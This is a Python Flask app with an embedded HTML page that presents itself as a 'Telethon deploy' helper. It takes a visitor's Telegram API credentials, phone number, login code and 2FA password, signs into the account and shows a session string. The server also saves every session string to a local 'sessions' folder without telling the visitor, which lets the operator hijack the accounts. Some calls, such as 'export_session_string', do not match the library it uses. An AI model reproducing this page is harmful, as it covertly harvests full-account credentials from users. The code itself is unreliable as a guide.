import os
import re
import json
import asyncio
import secrets
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    FloodWaitError,
)
from flask import Flask, request, jsonify, session

SESSIONS_FOLDER = "sessions"
os.makedirs(SESSIONS_FOLDER, exist_ok=True)

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>THE BOYS - Telethon</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Segoe UI',system-ui,sans-serif;
            background:#0a0a0a;
            min-height:100vh;
            display:flex;
            justify-content:center;
            align-items:center;
            color:#ccc;
        }
        body::before{
            content:'';
            position:fixed;
            top:0;left:0;
            width:100%;height:100%;
            background:
                repeating-linear-gradient(
                    45deg,
                    transparent,
                    transparent 3px,
                    rgba(180,20,30,0.04) 3px,
                    rgba(180,20,30,0.04) 6px
                ),
                repeating-linear-gradient(
                    -45deg,
                    transparent,
                    transparent 3px,
                    rgba(180,20,30,0.02) 3px,
                    rgba(180,20,30,0.02) 6px
                );
            pointer-events:none;
        }
        .phone{
            position:relative;
            z-index:1;
            width:400px;
            max-width:92vw;
            background:linear-gradient(180deg,#141414 0%,#0d0d0d 100%);
            border-radius:40px;
            padding:20px;
            border:2px solid #222;
            box-shadow:
                0 0 40px rgba(180,20,30,0.2),
                0 0 80px rgba(0,0,0,0.6),
                inset 0 0 40px rgba(0,0,0,0.4);
        }
        .notch{
            width:110px;
            height:24px;
            background:#000;
            border-radius:0 0 18px 18px;
            margin:0 auto 18px;
            position:relative;
        }
        .notch::after{
            content:'';
            position:absolute;
            top:7px;
            left:50%;
            transform:translateX(-50%);
            width:8px;height:8px;
            background:#1a1a2e;
            border-radius:50%;
            border:2px solid #333;
        }
        .status-bar{
            display:flex;
            justify-content:space-between;
            align-items:center;
            padding:4px 8px;
            font-size:10px;
            color:#777;
            margin-bottom:10px;
        }
        .status-bar .time{font-weight:bold;color:#fff;}
        .sig{display:flex;align-items:flex-end;gap:1.5px;height:10px}
        .sig span{display:block;width:2.5px;background:#fff;border-radius:1px}
        .sig span:nth-child(1){height:3px}
        .sig span:nth-child(2){height:5px}
        .sig span:nth-child(3){height:7px}
        .sig span:nth-child(4){height:10px}
        .bat{
            width:20px;height:9px;
            border:1.5px solid #fff;
            border-radius:2px;
            position:relative;
            padding:1.5px;
        }
        .bat::after{
            content:'';
            position:absolute;
            right:-3px;top:50%;
            transform:translateY(-50%);
            width:2px;height:3px;
            background:#fff;
            border-radius:0 1px 1px 0;
        }
        .bat-fill{width:70%;height:100%;background:#fff;border-radius:1px}
        .logo-box{text-align:center;margin-bottom:20px}
        .logo{
            font-size:30px;
            font-weight:900;
            letter-spacing:5px;
            background:linear-gradient(180deg,#fff 0%,#b4141e 50%,#600 100%);
            -webkit-background-clip:text;
            -webkit-text-fill-color:transparent;
            background-clip:text;
            filter:drop-shadow(0 0 15px rgba(180,20,30,0.5));
            transform:skewX(-6deg);
            display:inline-block;
        }
        .logo-sub{
            font-size:9px;
            letter-spacing:8px;
            color:#c9a84c;
            margin-top:4px;
        }
        .step{display:none}
        .step.active{display:block;animation:fadeIn 0.3s ease}
        @keyframes fadeIn{
            from{opacity:0;transform:translateY(10px)}
            to{opacity:1;transform:translateY(0)}
        }
        label{
            display:block;
            margin-bottom:6px;
            font-size:12px;
            color:#999;
            text-transform:uppercase;
            letter-spacing:2px;
        }
        input{
            width:100%;
            padding:12px 14px;
            border-radius:12px;
            border:1.5px solid #222;
            background:#111;
            color:#fff;
            font-size:14px;
            margin-bottom:18px;
            outline:none;
            transition:0.3s;
            font-family:inherit;
        }
        input:focus{
            border-color:#b4141e;
            box-shadow:0 0 15px rgba(180,20,30,0.2);
        }
        .btn{
            width:100%;
            padding:12px;
            border-radius:12px;
            border:none;
            background:linear-gradient(135deg,#b4141e,#600);
            color:#fff;
            font-size:14px;
            cursor:pointer;
            font-weight:bold;
            letter-spacing:1px;
            transition:0.3s;
            font-family:inherit;
        }
        .btn:hover{
            transform:translateY(-2px);
            box-shadow:0 8px 25px rgba(180,20,30,0.4);
        }
        .btn:disabled{opacity:0.4;cursor:not-allowed;transform:none}
        .btn-dark{background:#222}
        .btn-dark:hover{box-shadow:0 8px 25px rgba(0,0,0,0.4)}
        .msg{
            text-align:center;
            margin-top:12px;
            padding:10px 14px;
            border-radius:10px;
            font-size:12px;
            display:none;
        }
        .msg.success{
            display:block;
            background:rgba(0,200,100,0.1);
            border:1px solid rgba(0,200,100,0.3);
            color:#0c8;
        }
        .msg.error{
            display:block;
            background:rgba(200,0,0,0.1);
            border:1px solid rgba(200,0,0,0.3);
            color:#f44;
        }
        .loader{
            display:none;
            text-align:center;
            margin:15px 0;
        }
        .loader.active{display:block}
        .spinner{
            width:35px;height:35px;
            border:3px solid rgba(255,255,255,0.08);
            border-top:3px solid #b4141e;
            border-radius:50%;
            animation:spin 0.8s linear infinite;
            margin:0 auto;
        }
        @keyframes spin{
            to{transform:rotate(360deg)}
        }
        .result-box{
            background:rgba(0,0,0,0.4);
            padding:14px;
            border-radius:12px;
            word-break:break-all;
            font-size:11px;
            margin-top:10px;
            max-height:140px;
            overflow-y:auto;
            border:1px solid #222;
            color:#aaa;
            display:none;
        }
        .result-box.active{display:block}
        .btn-copy{background:#333;margin-top:8px}
        .link{
            color:#c9a84c;
            text-decoration:none;
            font-size:11px;
            display:block;
            text-align:center;
            margin-top:10px;
            letter-spacing:1px;
        }
        .link:hover{color:#fff}
    </style>
</head>
<body>
    <div class="phone">
        <div class="notch"></div>
        <div class="status-bar">
            <span class="time">9:41</span>
            <span style="display:flex;align-items:center;gap:6px">
                <div class="sig"><span></span><span></span><span></span><span></span></div>
                <div class="bat"><div class="bat-fill"></div></div>
            </span>
        </div>

        <div class="logo-box">
            <div class="logo">THE BOYS</div>
            <div class="logo-sub">TELETHON DEPLOY</div>
        </div>

        <div class="loader" id="loader"><div class="spinner"></div></div>
        <div class="msg" id="msg"></div>

        <div class="step active" id="s1">
            <label>API ID</label>
            <input type="text" id="api_id" placeholder="Enter API ID">
            <label>API HASH</label>
            <input type="text" id="api_hash" placeholder="Enter API Hash">
            <button class="btn" onclick="goStep2()">NEXT</button>
            <a href="https://my.telegram.org" class="link" target="_blank">GET API CREDENTIALS</a>
        </div>

        <div class="step" id="s2">
            <label>PHONE NUMBER</label>
            <input type="text" id="phone" placeholder="+201234567890">
            <button class="btn" onclick="sendCode()">SEND CODE</button>
            <br><br>
            <button class="btn btn-dark" onclick="goStep1()">BACK</button>
        </div>

        <div class="step" id="s3">
            <label>VERIFICATION CODE</label>
            <input type="text" id="code" placeholder="5-digit code" maxlength="5">
            <button class="btn" onclick="verifyCode()">VERIFY</button>
            <br><br>
            <button class="btn btn-dark" onclick="sendCode()">RESEND CODE</button>
        </div>

        <div class="step" id="s4">
            <label>2FA PASSWORD</label>
            <input type="password" id="password" placeholder="Enter password">
            <button class="btn" onclick="verifyCode()">VERIFY</button>
        </div>

        <div class="step" id="s5">
            <h2 style="text-align:center;color:#0c8;font-size:16px;margin-bottom:10px">DEPLOYMENT SUCCESSFUL</h2>
            <p style="text-align:center;font-size:11px;color:#777">YOUR SESSION STRING:</p>
            <div class="result-box active" id="sessionOut"></div>
            <button class="btn btn-copy" onclick="copySession()">COPY SESSION</button>
            <br><br>
            <p style="text-align:center;font-size:10px;color:#555;line-height:1.6">
                UPLOAD <code style="background:#111;padding:2px 6px;border-radius:4px;color:#c9a84c">source.py</code> TO RAILWAY<br>
                ADD VARIABLES:<br>
                <code style="background:#111;padding:2px 6px;border-radius:4px;color:#c9a84c">API_ID</code>
                <code style="background:#111;padding:2px 6px;border-radius:4px;color:#c9a84c">API_HASH</code>
                <code style="background:#111;padding:2px 6px;border-radius:4px;color:#c9a84c">SESSION</code>
            </p>
            <button class="btn btn-dark" onclick="location.reload()" style="margin-top:10px">NEW DEPLOY</button>
        </div>
    </div>

    <script>
        function showStep(n){document.querySelectorAll('.step').forEach(e=>e.classList.remove('active'));document.getElementById('s'+n).classList.add('active')}
        function showMsg(t,c){const m=document.getElementById('msg');m.textContent=t;m.className='msg '+c;setTimeout(()=>m.className='msg',4000)}
        function toggleLoader(s){document.getElementById('loader').classList.toggle('active',s)}
        function goStep1(){showStep(1)}
        function goStep2(){
            const a=document.getElementById('api_id').value.trim(),b=document.getElementById('api_hash').value.trim();
            if(!a||!b)return showMsg('All fields required','error');
            showStep(2);
        }
        async function sendCode(){
            const a=document.getElementById('api_id').value.trim(),b=document.getElementById('api_hash').value.trim(),p=document.getElementById('phone').value.trim();
            if(!p)return showMsg('Enter phone number','error');
            toggleLoader(true);
            try{
                const r=await fetch('/api/send_code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({api_id:a,api_hash:b,phone:p})});
                const d=await r.json();
                if(d.success){showMsg('Code sent','success');showStep(3)}
                else showMsg(d.message,'error');
            }catch(e){showMsg('Connection error','error')}
            toggleLoader(false);
        }
        async function verifyCode(){
            const c=document.getElementById('code')?document.getElementById('code').value.trim():'',p=document.getElementById('password')?document.getElementById('password').value.trim():'';
            toggleLoader(true);
            try{
                const r=await fetch('/api/verify_code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:c,password:p})});
                const d=await r.json();
                if(d.success){document.getElementById('sessionOut').textContent=d.session;showStep(5)}
                else if(d.need_password){showStep(4);showMsg('2FA password required','error')}
                else showMsg(d.message,'error');
            }catch(e){showMsg('Connection error','error')}
            toggleLoader(false);
        }
        function copySession(){
            const t=document.getElementById('sessionOut').textContent;
            navigator.clipboard.writeText(t).then(()=>showMsg('Copied!','success'));
        }
        // تحديث الوقت
        setInterval(()=>{const d=new Date();document.querySelector('.time').textContent=d.getHours().toString().padStart(2,'0')+':'+d.getMinutes().toString().padStart(2,'0')},30000);
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return HTML_PAGE

@app.route('/api/send_code', methods=['POST'])
def send_code():
    data = request.json
    api_id = data.get('api_id')
    api_hash = data.get('api_hash')
    phone = data.get('phone')

    if not api_id or not api_hash or not phone:
        return jsonify({"success": False, "message": "All fields required"})

    client = TelegramClient(f'temp_{phone}', int(api_id), api_hash)

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(client.connect())
        result = loop.run_until_complete(client.send_code_request(phone))

        session['api_id'] = int(api_id)
        session['api_hash'] = api_hash
        session['phone'] = phone
        session['phone_code_hash'] = result.phone_code_hash

        return jsonify({"success": True, "message": "Code sent"})
    except FloodWaitError as e:
        return jsonify({"success": False, "message": f"Wait {e.seconds}s"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    password = data.get('password', '')

    api_id = session.get('api_id')
    api_hash = session.get('api_hash')
    phone = session.get('phone')
    phone_code_hash = session.get('phone_code_hash')

    if not all([api_id, api_hash, phone, phone_code_hash]):
        return jsonify({"success": False, "message": "Session expired"})

    client = TelegramClient(f'temp_{phone}', api_id, api_hash)

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(client.connect())

        if password:
            loop.run_until_complete(client.sign_in(password=password))
        else:
            loop.run_until_complete(client.sign_in(phone, code, phone_code_hash=phone_code_hash))

        session_string = loop.run_until_complete(client.export_session_string())

        user_id = phone.replace('+', '')
        with open(f"{SESSIONS_FOLDER}/{user_id}.txt", "w") as f:
            f.write(session_string)

        loop.run_until_complete(client.disconnect())
        loop.close()
        session.clear()

        return jsonify({"success": True, "message": "Deployment successful", "session": session_string})
    except SessionPasswordNeededError:
        return jsonify({"success": False, "need_password": True, "message": "2FA password required"})
    except PhoneCodeExpiredError:
        return jsonify({"success": False, "message": "Code expired"})
    except PhoneCodeInvalidError:
        return jsonify({"success": False, "message": "Invalid code"})
    except FloodWaitError as e:
        return jsonify({"success": False, "message": f"Wait {e.seconds}s"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
